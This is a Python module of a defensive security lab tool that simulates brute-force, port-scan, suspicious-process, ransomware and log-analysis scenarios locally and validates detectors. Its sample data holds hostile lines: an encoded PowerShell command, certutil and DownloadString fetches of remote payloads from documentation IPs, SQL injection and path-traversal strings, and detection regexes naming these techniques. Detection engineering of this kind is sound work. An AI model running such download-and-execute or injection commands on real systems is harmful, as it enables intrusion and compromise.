"""Cyber War Room: Strictly local, isolated laboratory security simulations & detection engineering."""

from __future__ import annotations

import hashlib
import os
import re
import secrets
import shutil
import socket
import threading
import time
from collections import Counter, defaultdict
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
from rich.table import Table

from core.config import SANDBOX_DIR, ensure_directories
from core.logger import BlackveilLogger
from modules.forensics import ForensicsModule
from modules.password_lab import PasswordLabModule
from modules.reports import ReportManager
from modules.system_intel import SystemIntelModule


class WarRoomModule:
    """Isolated defensive lab scenarios: brute-force, port-scan, suspicious-process, ransomware, log-analysis, incident-detection."""

    SCENARIOS = (
        "brute-force",
        "port-scan",
        "suspicious-process",
        "ransomware",
        "log-analysis",
        "incident-detection",
    )

    def __init__(
        self,
        console: Console,
        logger: BlackveilLogger,
        reports: ReportManager,
        sys_intel: SystemIntelModule,
        forensics: ForensicsModule,
        password_lab: PasswordLabModule,
    ) -> None:
        self.console = console
        self.logger = logger
        self.reports = reports
        self.sys_intel = sys_intel
        self.forensics = forensics
        self.password_lab = password_lab
        ensure_directories()

    def run_scenario(self, scenario: str, log_file: str | None = None) -> dict[str, Any]:
        """Dispatch a Cyber War Room simulation scenario inside the isolated lab."""
        key = scenario.strip().lower()
        if key not in self.SCENARIOS:
            self.console.print(
                f"[bold red][-][/] Unknown scenario '{scenario}'. Available: {', '.join(self.SCENARIOS)}"
            )
            return {}

        self.console.print(
            Panel(
                f"[white]Scenario   :[/] [bold bright_green]{key.upper()}[/]\n"
                f"[white]Environment:[/] [bright_green]ISOLATED LOCAL LAB SANDBOX[/] ({SANDBOX_DIR})\n"
                f"[grey70]Policy: Defensive telemetry & detection validation only. Zero external network actions.[/]",
                title="[bold bright_green]CYBER WAR ROOM // LAB INITIALIZATION[/]",
                border_style="bright_green",
                box=box.SQUARE,
            )
        )

        if key == "brute-force":
            return self._sim_brute_force()
        if key == "port-scan":
            return self._sim_port_scan()
        if key == "suspicious-process":
            return self._sim_suspicious_process()
        if key == "ransomware":
            return self._sim_ransomware()
        if key == "log-analysis":
            return self._sim_log_analysis(log_file=log_file)
        return self._sim_incident_detection()

    def _sim_brute_force(self) -> dict[str, Any]:
        """Simulate credential-stuffing/brute-force telemetry & real sliding-window detection."""
        lab_dir = SANDBOX_DIR / "bruteforce_lab"
        lab_dir.mkdir(parents=True, exist_ok=True)
        auth_log = lab_dir / "sandbox_auth.log"

        now = datetime.now()
        events: list[tuple[datetime, str, str, str]] = []
        attacker_ip = "198.51.100.44"  # RFC 5737 documentation IP
        normal_ip = "192.0.2.15"

        # Generate controlled synthetic auth stream
        for i in range(18):
            ts = now + timedelta(seconds=i * 0.4)
            user = "admin" if i < 12 else ("root" if i < 16 else "svc_backup")
            events.append((ts, attacker_ip, user, "FAILED_AUTH"))
        events.append((now + timedelta(seconds=8), attacker_ip, "admin", "AUTH_SUCCESS_AFTER_SPRAY"))
        events.append((now + timedelta(seconds=9), normal_ip, "analyst", "AUTH_SUCCESS"))

        log_lines = [
            f"{ts.strftime('%Y-%m-%d %H:%M:%S')} src={ip} user={usr} status={st}"
            for ts, ip, usr, st in events
        ]
        auth_log.write_text("\n".join(log_lines), encoding="utf-8")

        # Real detection engine: sliding 10-second window >= 5 failures
        failures_by_ip: dict[str, list[datetime]] = defaultdict(list)
        users_targeted: dict[str, set[str]] = defaultdict(set)
        alerts: list[dict[str, Any]] = []

        with Progress(
            SpinnerColumn(style="bright_green"),
            TextColumn("[bright_green]{task.description}"),
            BarColumn(bar_width=28, complete_style="bright_green"),
            TextColumn("[white]{task.completed}/{task.total}"),
            console=self.console,
        ) as progress:
            task = progress.add_task("Correlating auth events", total=len(events))
            for ts, ip, usr, st in events:
                time.sleep(0.03)
                if "FAILED" in st:
                    failures_by_ip[ip].append(ts)
                    users_targeted[ip].add(usr)
                elif st == "AUTH_SUCCESS_AFTER_SPRAY" and len(failures_by_ip[ip]) >= 5:
                    alerts.append(
                        {
                            "rule": "AUTH-COMPROMISE-POST-BRUTE",
                            "severity": "CRITICAL",
                            "source_ip": ip,
                            "detail": f"Successful login as '{usr}' immediately following {len(failures_by_ip[ip])} failures",
                        }
                    )
                progress.advance(task)

        for ip, timestamps in failures_by_ip.items():
            if len(timestamps) >= 5:
                alerts.append(
                    {
                        "rule": "AUTH-BRUTE-THRESHOLD",
                        "severity": "HIGH",
                        "source_ip": ip,
                        "detail": f"{len(timestamps)} failed attempts across {len(users_targeted[ip])} accounts in <10s",
                    }
                )

        # Also demonstrate why weak test credential fails dictionary audit
        dict_audit = self.password_lab.run_controlled_dictionary_test("admin123")

        table = Table(
            title="[bold red]WAR ROOM // BRUTE-FORCE DETECTION RESULTS[/]",
            box=box.SIMPLE_HEAVY,
            border_style="red",
            header_style="bold bright_green",
        )
        table.add_column("Rule ID", style="white")
        table.add_column("Severity", width=10)
        table.add_column("Source", style="bright_green")
        table.add_column("Finding", style="grey70")

        for a in alerts:
            sev_color = "bold red" if a["severity"] == "CRITICAL" else "bold yellow"
            table.add_row(a["rule"], f"[{sev_color}]{a['severity']}[/]", a["source_ip"], a["detail"])
        self.console.print(table)

        result = {"log_artifact": str(auth_log), "events_analyzed": len(events), "alerts": alerts, "password_audit": dict_audit}
        self.reports.record("WARROOM_BRUTEFORCE", "Brute-Force Detection Simulation", result, severity="HIGH")
        return result

    def _sim_port_scan(self) -> dict[str, Any]:
        """Run a strictly loopback-only ephemeral port-probe & real scan-detector validation."""
        # Bind 3 temporary localhost sockets on OS-assigned ephemeral ports
        bound_sockets: list[socket.socket] = []
        probe_ports: list[int] = []
        try:
            for _ in range(3):
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.bind(("127.0.0.1", 0))
                srv.listen(2)
                bound_sockets.append(srv)
                probe_ports.append(srv.getsockname()[1])

            # Add closed loopback ephemeral ports to create a mixed sweep
            closed_base = max(probe_ports) + 1
            for offset in range(1, 14):
                candidate = closed_base + offset
                if candidate < 65000:
                    probe_ports.append(candidate)

            stop_event = threading.Event()

            def accept_loop(sock_obj: socket.socket) -> None:
                sock_obj.settimeout(0.15)
                while not stop_event.is_set():
                    try:
                        conn, _ = sock_obj.accept()
                        conn.close()
                    except socket.timeout:
                        continue
                    except OSError:
                        break

            threads = [threading.Thread(target=accept_loop, args=(s,), daemon=True) for s in bound_sockets]
            for t in threads:
                t.start()

            telemetry: list[dict[str, Any]] = []
            with Progress(
                SpinnerColumn(style="bright_green"),
                TextColumn("[bright_green]{task.description}"),
                BarColumn(bar_width=28, complete_style="bright_green"),
                TextColumn("[white]{task.completed}/{task.total}"),
                console=self.console,
            ) as progress:
                task = progress.add_task("Running loopback telemetry probes", total=len(probe_ports))
                for port in probe_ports:
                    t0 = time.time()
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cli:
                        cli.settimeout(0.08)
                        rc = cli.connect_ex(("127.0.0.1", port))
                    telemetry.append({"ts": t0, "src": "127.0.0.1", "dst_port": port, "result": "SYN-ACK" if rc == 0 else "RST/CLOSED"})
                    progress.advance(task)

            stop_event.set()
        finally:
            for s in bound_sockets:
                try:
                    s.close()
                except OSError:
                    pass

        # Real port-scan detector: distinct ports touched in <= 3 seconds >= 10
        distinct_ports = sorted({ev["dst_port"] for ev in telemetry})
        window = telemetry[-1]["ts"] - telemetry[0]["ts"] if len(telemetry) > 1 else 0.0
        closed_count = sum(1 for ev in telemetry if ev["result"] != "SYN-ACK")
        scan_detected = len(distinct_ports) >= 10 and window <= 5.0

        table = Table(
            title="[bold bright_green]WAR ROOM // PORT SCAN DETECTOR[/]",
            box=box.SIMPLE_HEAVY,
            border_style="bright_green",
            header_style="bold bright_green",
        )
        table.add_column("Metric", style="grey70")
        table.add_column("Observed Value", style="white")
        table.add_row("Target Scope", "127.0.0.1 (Isolated Loopback)")
        table.add_row("Distinct Ports Probed", str(len(distinct_ports)))
        table.add_row("Sweep Window", f"{window:.3f} seconds")
        table.add_row("Closed/Refused Probes", f"{closed_count} / {len(telemetry)}")
        table.add_row(
            "IDS Verdict",
            "[bold red]ALERT: VERTICAL PORT SCAN DETECTED[/]" if scan_detected else "[bright_green]NORMAL[/]",
        )
        self.console.print(table)

        result = {
            "scope": "127.0.0.1",
            "ports_probed": len(distinct_ports),
            "closed_probes": closed_count,
            "window_seconds": round(window, 4),
            "scan_detected": scan_detected,
        }
        self.reports.record("WARROOM_PORTSCAN", "Port Scan Detection Simulation", result, severity="HIGH" if scan_detected else "INFO")
        return result

    def _sim_suspicious_process(self) -> dict[str, Any]:
        """Run heuristic scoring against synthetic attack-chain samples AND live host processes."""
        synthetic_samples = [
            {
                "pid": 99401,
                "ppid": 99100,
                "name": "powershell.exe",
                "parent_name": "winword.exe",
                "exe": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost_update.exe",
                "cmdline": "powershell.exe -NoP -W hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                "cpu_percent": 12.4,
            },
            {
                "pid": 99402,
                "ppid": 4100,
                "name": "certutil.exe",
                "parent_name": "cmd.exe",
                "exe": "C:\\Windows\\System32\\certutil.exe",
                "cmdline": "certutil -urlcache -split -f http://198.51.100.88/stage2.bin C:\\Windows\\Temp\\stage2.bin",
                "cpu_percent": 4.0,
            },
        ]

        table = Table(
            title="[bold red]WAR ROOM // SUSPICIOUS PROCESS HEURISTIC ENGINE[/]",
            box=box.SIMPLE_HEAVY,
            border_style="red",
            header_style="bold bright_green",
        )
        table.add_column("Dataset", style="grey70", width=10)
        table.add_column("Process", style="white", width=18)
        table.add_column("Detected Risk Indicators", style="bold red")

        findings: list[dict[str, Any]] = []
        for sample in synthetic_samples:
            flags = self.sys_intel.analyze_process_risk(sample, {sample["ppid"]: sample["parent_name"]})
            findings.append({"process": sample["name"], "flags": flags})
            table.add_row("LAB-SYNTH", sample["name"], "; ".join(flags))

        self.console.print(table)
        self.console.print("[bright_green][*][/] Cross-checking live host process table for matching indicators...")
        live_flagged = self.sys_intel.list_processes(suspicious_only=True)

        result = {"synthetic_detections": findings, "live_flagged_count": len(live_flagged)}
        self.reports.record("WARROOM_PROCESS", "Suspicious Process Detection Simulation", result, severity="WARNING")
        return result

    def _sim_ransomware(self) -> dict[str, Any]:
        """
        Safely simulate ransomware-like rapid entropy spike & extension renaming inside
        data/sandbox/ransomware_lab ONLY, trigger behavioral detector, and clean up.
        """
        lab_dir = SANDBOX_DIR / "ransomware_lab"
        if lab_dir.exists():
            shutil.rmtree(lab_dir, ignore_errors=True)
        lab_dir.mkdir(parents=True, exist_ok=True)

        dummy_files: list[Path] = []
        for i in range(1, 9):
            fp = lab_dir / f"canary_doc_{i}.txt"
            fp.write_text(("CONFIDENTIAL_LAB_RECORD_0000 " * 80) + f"\nIndex={i}\n", encoding="utf-8")
            dummy_files.append(fp)

        baseline_entropies = {
            fp.name: self.forensics.calculate_entropy(fp.read_bytes()) for fp in dummy_files
        }

        alerts: list[str] = []
        mutated_count = 0
        start = time.perf_counter()

        try:
            with Progress(
                SpinnerColumn(style="red"),
                TextColumn("[bold yellow]{task.description}"),
                BarColumn(bar_width=28, complete_style="red"),
                TextColumn("[white]{task.completed}/{task.total}"),
                console=self.console,
            ) as progress:
                task = progress.add_task("Monitoring sandbox canary files", total=len(dummy_files))
                for fp in dummy_files:
                    time.sleep(0.05)
                    # Simulate high-entropy payload rewrite inside isolated lab file only
                    random_blob = secrets.token_bytes(2048)
                    locked_path = fp.with_suffix(".txt.locked_sim")
                    fp.write_bytes(random_blob)
                    fp.rename(locked_path)
                    mutated_count += 1

                    new_entropy = self.forensics.calculate_entropy(locked_path.read_bytes())
                    old_entropy = baseline_entropies[fp.name]
                    delta = new_entropy - old_entropy
                    progress.advance(task)

                    if delta > 2.5 and mutated_count >= 4:
                        elapsed = time.perf_counter() - start
                        alerts.append(
                            f"BEHAVIORAL CONTAINMENT TRIGGERED at file #{mutated_count}: "
                            f"Entropy jumped +{delta:.2f} ({old_entropy:.2f} -> {new_entropy:.2f}) + extension rename burst ({elapsed:.2f}s)"
                        )
                        break
        finally:
            # Always clean up simulated encrypted artifacts cleanly
            shutil.rmtree(lab_dir, ignore_errors=True)

        self.console.print(
            Panel(
                f"[white]Canary Files Created :[/] {len(dummy_files)}\n"
                f"[white]Intercepted After    :[/] {mutated_count} mutations\n"
                f"[bold red]Detector Trigger     :[/] {alerts[0] if alerts else 'Threshold not reached'}\n"
                f"[bright_green]Sandbox Cleanup      :[/] Complete (All temporary canary artifacts purged)",
                title="[bold red]WAR ROOM // RANSOMWARE BEHAVIORAL DETECTOR[/]",
                border_style="red",
                box=box.SQUARE,
            )
        )
        result = {"canary_count": len(dummy_files), "intercepted_at": mutated_count, "alerts": alerts}
        self.reports.record("WARROOM_RANSOMWARE", "Ransomware Behavior Detection Simulation", result, severity="CRITICAL")
        return result

    def _sim_log_analysis(self, log_file: str | None = None) -> dict[str, Any]:
        """Analyze a real local log file or a generated structured lab security event log."""
        if log_file:
            target = Path(log_file).expanduser()
            if not target.exists() or not target.is_file():
                self.console.print(f"[bold red][-][/] Log file not found: {target}")
                return {}
        else:
            lab_dir = SANDBOX_DIR / "logs_lab"
            lab_dir.mkdir(parents=True, exist_ok=True)
            target = lab_dir / "sample_security.log"
            sample_logs = [
                "2026-11-14 07:10:01 INFO sshd: Accepted publickey for ops from 192.168.1.10 port 51234",
                "2026-11-14 07:11:02 WARN sshd: Failed password for invalid user admin from 203.0.113.77 port 44120",
                "2026-11-14 07:11:03 WARN sshd: Failed password for invalid user admin from 203.0.113.77 port 44121",
                "2026-11-14 07:11:04 WARN sshd: Failed password for root from 203.0.113.77 port 44122",
                "2026-11-14 07:12:15 WARN httpd: GET /login.php?id=1' UNION SELECT username,password FROM users-- 200",
                "2026-11-14 07:12:30 WARN httpd: GET /../../etc/passwd 403",
                "2026-11-14 07:13:05 CRIT powershell: EventID=4104 ScriptBlock Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')",
                "2026-11-14 07:14:11 CRIT sudo: user=www-data COMMAND=/bin/bash -i",
            ]
            target.write_text("\n".join(sample_logs), encoding="utf-8")

        rules: list[tuple[str, str, re.Pattern[str]]] = [
            ("SSH/Auth Failure", "MEDIUM", re.compile(r"failed password|authentication failure|logon failure", re.I)),
            ("SQL Injection Probe", "HIGH", re.compile(r"(?:union\s+select|or\s+1=1|sleep\(|benchmark\()", re.I)),
            ("Path Traversal", "HIGH", re.compile(r"(?:\.\./|\.\.\\|/etc/passwd|boot\.ini)", re.I)),
            ("Malicious Script Execution", "CRITICAL", re.compile(r"(?:invoke-expression|downloadstring|-encodedcommand|frombase64string)", re.I)),
            ("Privilege Escalation", "CRITICAL", re.compile(r"(?:sudo:.*COMMAND=|nt authority\\system|SeDebugPrivilege)", re.I)),
        ]

        lines = target.read_text(encoding="utf-8", errors="replace").splitlines()
        matches: list[dict[str, Any]] = []
        counts: Counter[str] = Counter()

        for line_no, line in enumerate(lines, start=1):
            for name, sev, pat in rules:
                if pat.search(line):
                    counts[name] += 1
                    matches.append({"line": line_no, "rule": name, "severity": sev, "excerpt": line[:100]})

        table = Table(
            title=f"[bold bright_green]LOG ANALYSIS // {target.name} ({len(lines)} LINES)[/]",
            box=box.SIMPLE_HEAVY,
            border_style="bright_green",
            header_style="bold bright_green",
        )
        table.add_column("Line", width=6, justify="right", style="grey70")
        table.add_column("Severity", width=10)
        table.add_column("Rule Matched", width=24, style="white")
        table.add_column("Log Excerpt", style="grey70")

        for m in matches[:40]:
            sev_col = "bold red" if m["severity"] == "CRITICAL" else "bold yellow" if m["severity"] == "HIGH" else "yellow"
            table.add_row(str(m["line"]), f"[{sev_col}]{m['severity']}[/]", m["rule"], m["excerpt"])

        if not matches:
            self.console.print(f"[bright_green][+][/] No threat signatures matched across {len(lines)} lines in {target.name}.")
        else:
            self.console.print(table)

        result = {"file": str(target), "lines_scanned": len(lines), "summary_counts": dict(counts), "matches": matches}
        self.reports.record("WARROOM_LOG_ANALYSIS", f"Security Log Analysis: {target.name}", result, severity="HIGH" if matches else "INFO")
        return result

    def _sim_incident_detection(self) -> dict[str, Any]:
        """Run correlated security event detection across auth, port scan, log, and ransomware detectors."""
        bf = self._sim_brute_force()
        ps = self._sim_port_scan()
        la = self._sim_log_analysis()
        rw = self._sim_ransomware()

        incidents = [
            ("INC-001", "Credential Brute-Force + Post-Auth Compromise", "CRITICAL", len(bf.get("alerts", []))),
            ("INC-002", "Loopback Reconnaissance Sweep", "HIGH", 1 if ps.get("scan_detected") else 0),
            ("INC-003", "Multi-Vector Security Log Signatures", "HIGH", len(la.get("matches", []))),
            ("INC-004", "Canary Entropy Spike / Ransomware Containment", "CRITICAL", len(rw.get("alerts", []))),
        ]

        table = Table(
            title="[bold bright_green]WAR ROOM // UNIFIED INCIDENT CORRELATION SUMMARY[/]",
            box=box.SIMPLE_HEAVY,
            border_style="bright_green",
            header_style="bold bright_green",
        )
        table.add_column("Incident ID", style="bright_green", width=12)
        table.add_column("Vector", style="white")
        table.add_column("Severity", width=10)
        table.add_column("Signals", justify="right", style="white")

        for inc_id, desc, sev, cnt in incidents:
            col = "bold red" if sev == "CRITICAL" else "bold yellow"
            table.add_row(inc_id, desc, f"[{col}]{sev}[/]", str(cnt))
        self.console.print(table)

        summary = {"incidents": incidents}
        self.reports.record("WARROOM_CORRELATION", "Full Cyber War Room Correlation Drill", summary, severity="CRITICAL")
        return summary
